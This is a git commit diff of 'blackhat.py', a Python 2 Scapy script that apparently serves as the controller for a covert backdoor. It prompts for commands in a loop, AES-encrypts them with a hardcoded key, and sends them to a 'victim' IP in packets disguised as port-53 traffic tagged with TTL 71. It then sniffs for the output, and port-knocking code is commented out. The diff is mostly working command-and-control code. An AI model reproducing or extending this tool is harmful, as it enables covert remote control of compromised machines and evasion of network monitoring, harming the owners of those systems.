3dd3a78b3a53c65b7c83a4ed7d36e16b3e54f712
root <root@localhost.localdomain>
2015-10-16 23:21:05 -0700

    FINALLY GOT IT OUT OF SATAN

--- blackhat.py
+++ blackhat.py
@@ -4,8 +4,8 @@ from scapy.all import * #Scapy library used to craft packets
 from Crypto.Cipher import AES #PiCrypto used for encrypting commands in AES
 import time #used for thread sleep methods
 
-global dstIP
-global dstPort
+global targetIP
+global targetPort
 
 
 def sendCommand(command):
@@ -14,24 +14,10 @@ def sendCommand(command):
     #If it's the first command, send the port knocks
     global counter
     print "The counter is at %d"%(counter)
-
-    #If this is the first message being sent, do a port knock.
-    # UNCOMMENT THIS LATER.
-    # if(counter == 0):
-    #     print "First Message, Authenticating with a port knock first.."
-    #     print "The dstIP is STILL %s"%(dstIP)
-    #     knockPorts(dstIP)
-    #     #wait for response from client
-    #     sniff(filter='ip', stop_filter=stopfilter)
-    #     print "Got here!"
-    #Not the first time sending OR
-    #Response from client received, TIME TO SEND!
-    print "TIME TO SEND!"
     send(craftCommandPacket(command));
     return;
 
-
-def knockPorts(dstIP):
+def knockPorts(targetIP):
     #Send packet sequence 90,91,92
     send(craftKnockPacket(514));
     #Sleep for a second so that Client has time to process.
@@ -41,80 +27,76 @@ def knockPorts(dstIP):
     send(craftKnockPacket(516));
     #TEST1: Check Wireshark
 
-#Function takes in Destination IP, Destination Port, Data to send
-def craftKnockPacket(srcPort):
-    global dstIP
-    packet = IP(dst=dstIP)/UDP(sport=srcPort, dport=53)
-    print "Crafted packet for IP %s with dstPort %s"%(dstIP,dstPort)
-    return packet;
-
-def stopfilter(x):
-    #If it's from the client's IP
-    #TODO: Check if it has the right data.
-     global dstIP
-     global counter
-     counter = counter + 1
-     #If the packet that just came in matches the victims IP
-     if x[IP].src == dstIP:
-         return True
-     else:
-         return False
+# #Function takes in Destination IP, Destination Port, Data to send
+# def craftKnockPacket(srcPort):
+#     global targetIP
+#     packet = IP(dst=targetIP)/UDP(sport=srcPort, dport=53)
+#     print "Crafted packet for IP %s with targetPort %s"%(targetIP,srcPort)
+#     return packet;
+#
+# def knockReply(packet):
+#     #If it's from the client's IP
+#     #TODO: Check if it has the right data.
+#      global targetIP
+#      global counter
+#      counter = counter + 1
+#      if IP in packet[0]:
+#          #If the packet that just came in matches the victims IP
+#          if packet[IP].src == targetIP:
+#              return True
+#          else:
+#              return False
+#      else:
+#          return False
 
 def craftCommandPacket(command):
-    global dstIP
-    global dstPort
-    print "dstIP is %s"%dstIP
-    print "dstPort is %s"%dstPort
-    print "comand is %s"%command
+    global targetIP
+    global targetPort
     #TODO:
     # data = encryptMessage(command)
-
-    print "Sending command packet"
-    packet = (IP(dst=dstIP)/UDP(sport=int(dstPort),dport=53)/command)
+    data = command
+    packet = (IP(dst=targetIP,ttl=71)/TCP(sport=int(targetPort),dport=53)/ data)
     return packet
 
-#Not finished yet
-# def encryptMessage(command):
-#     print "Encrypting command: %s"%command
-#     key = '0123456789abcdef'
-#     IV = 16 * '\x00'           # Initialization vector: discussed later
-#     mode = AES.MODE_CBC
-#     encryptor = AES.new(key, mode, IV=IV)
-#
-#     if(len(command) <> 16)
-#         text = padCommand(command)
-#     print text
-#     ciphertext = encryptor.encrypt(text)
-#     print "encryptedCommand is: %s"%ciphertext
-#     return ciphertext
+def encryptCommand(command):
+    key='0123456789abcdef'
+    IV = "abcdefghijklmnop"
+    encryptor = AES.new(key,AES.MODE_CFB,IV=IV)
+    return encryptor.encrypt(command)
 
+def commandResult(packet):
+    if IP in packet[0]:
+        global targetIP
+        srcIP = packet[IP].src
+        ttl = packet[IP].ttl
+        if srcIP == targetIP and ttl ==71:
+            print packet.load
+            return True
+        else:
+            return False
+    else:
+        return False
 
-def padCommand(command):
-    print "Len of command is %d"%(len(command))
-
-def listenForResponse():
-    print "Listening for response"
-    global dstIP
-    global dstPort
-#
 #PsuedoCode:
 # 1. Get command line arguments
-global dstIP
-dstIP = sys.argv[1]
-print "Dst IP is %s"%(dstIP)
-global dstPort
-dstPort = sys.argv[2]
-print "Dst Port is %s"%(dstPort)
+global targetIP
+if len(sys.argv) < 2:
+    print "Please use format python blackhat.py targetIP targetPort"
+else:
+    targetIP = sys.argv[1]
+    print "START Victim IP is %s"%(targetIP)
+    global targetPort
+    targetPort = sys.argv[2]
+    print "START Victim Port is %s"%(targetPort)
+    # Go into the send/receive loop
+    counter = 0;
+    while True:
 
-
-# Go into the send/receive loop
-print "Ready to send/receive with Destination %s : %s"%(dstIP,dstPort)
-counter = 0;
-while True:
-    ##SEND
-    print "Enter in command to send"
-    command = raw_input()
-    print "Command is %s"%(command)
-    print "IP is still %s"%(dstIP)
-    sendCommand(command)
-    listenForResponse()
+        ##SEND
+        print "ENTER COMMAND -> " + targetIP + ":"
+        command = raw_input()
+        # if counter == 0:
+        #     knockPorts(targetIP)
+        #     sniff( filter="udp and sport 3000", stop_filter=knockReply)
+        sendCommand(encryptCommand(command))
+        sniff(timeout=1, filter="tcp and and dst port 500 and src port 53", stop_filter=commandResult)
